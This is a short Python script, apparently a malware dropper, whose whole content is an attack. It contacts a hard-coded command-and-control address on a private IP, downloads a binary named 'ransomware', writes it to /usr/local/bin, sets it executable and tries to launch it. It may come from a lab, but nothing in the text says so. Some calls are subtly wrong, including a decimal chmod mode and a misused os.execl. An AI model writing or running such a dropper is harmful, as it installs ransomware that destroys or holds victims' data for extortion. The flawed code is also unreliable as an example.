import requests
import os

class Dropper():
    CNC_ADDRESS="http://172.19.0.2:6666/"

    def get_malware(self):
        url = Dropper.CNC_ADDRESS + "malware"
        resp = requests.get(url)
        binary_file = resp.content

        path = "/usr/local/bin/ransomware"
        with open(path, "wb") as f:
            f.write(binary_file)

        os.chmod(path, 755)

        os.execl("ransomware")



if __name__=="__main__":
    dropper = Dropper()
    dropper.get_malware()
